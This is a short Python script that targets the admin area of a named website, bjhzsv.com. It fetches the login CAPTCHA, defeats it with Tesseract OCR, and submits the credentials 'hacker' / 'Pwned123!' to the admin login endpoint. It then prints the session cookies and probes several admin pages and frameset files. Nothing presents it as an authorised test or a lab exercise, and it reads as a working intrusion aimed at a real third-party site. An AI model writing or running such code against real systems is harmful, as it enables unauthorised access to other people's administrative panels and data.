import urllib.request, urllib.parse, io
import http.cookiejar, re
from PIL import Image
import pytesseract

cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

# Login
for attempt in range(5):
    resp = opener.open('http://bjhzsv.com/main/inc/code.asp', timeout=10)
    cap_data = resp.read()
    img = Image.open(io.BytesIO(cap_data))
    img = img.convert('L')
    img = img.point(lambda x: 0 if x < 200 else 255)
    code = pytesseract.image_to_string(img, config='--psm 8').strip().replace(' ', '').lower()
    if len(code) >= 3:
        data = urllib.parse.urlencode({'t1': 'hacker', 't2': 'Pwned123!', 't3': code}).encode()
        resp = opener.open('http://bjhzsv.com/main/a7chkuser.asp', data, timeout=10)
        body = resp.read().decode('gb2312', errors='replace')
        print(f'Login response: {body[:200]}')
        if '验证码错误' not in body:
            print('Login OK!')
            break

# Check cookies
for cookie in cj:
    print(f'Cookie: {cookie.name}={cookie.value}')

# Now check if there's a frameset redirect
# Try the page it redirects to
resp = opener.open('http://bjhzsv.com/main/a7admin.asp', timeout=10)
body = resp.read().decode('gb2312', errors='replace')
print(f'a7admin.asp: {len(body)} bytes')
print(f'Content: {body[:500]}')

# Try a7index main page  
resp = opener.open('http://bjhzsv.com/main/a7index.asp', timeout=10)
body = resp.read().decode('gb2312', errors='replace')
print(f'a7index.asp: {len(body)} bytes - {body[:200]}')

# Check if there's an index frame page
for f in ['a7index.htm', 'index.htm', 'admin_index.htm', 'admin_frameset.asp']:
    try:
        resp = opener.open('http://bjhzsv.com/main/' + f, timeout=5)
        body = resp.read().decode('gb2312', errors='replace')
        print(f'{f}: {len(body)} bytes - {body[:200]}')
    except:
        print(f'{f}: error')
